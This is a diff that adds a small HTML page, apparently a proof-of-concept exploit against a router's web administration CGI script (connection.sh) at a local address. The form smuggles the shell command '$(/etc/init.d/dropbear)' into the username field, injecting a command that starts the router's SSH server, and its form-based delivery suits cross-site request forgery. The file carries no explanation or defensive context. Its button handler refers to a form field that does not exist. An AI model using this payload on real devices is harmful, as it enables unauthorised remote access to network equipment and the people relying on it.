@@ -1,0 +1,11 @@
+<html> 
+<head> 
+</head> 
+<body> 
+<center> 
+<form method="post" action="http://192.168.10.1/cgi-bin/webif/connection.sh" enctype="multipart/form-data"> 
+<input name="username" value="$(/etc/init.d/dropbear)" size="68" > 
+<input type="submit" name="submit" value="Submit" onClick="{this.form.wifimode.value='";' + this.form.wifimode.value +';"'}" /> 
+</form> 
+</body> 
+</html>
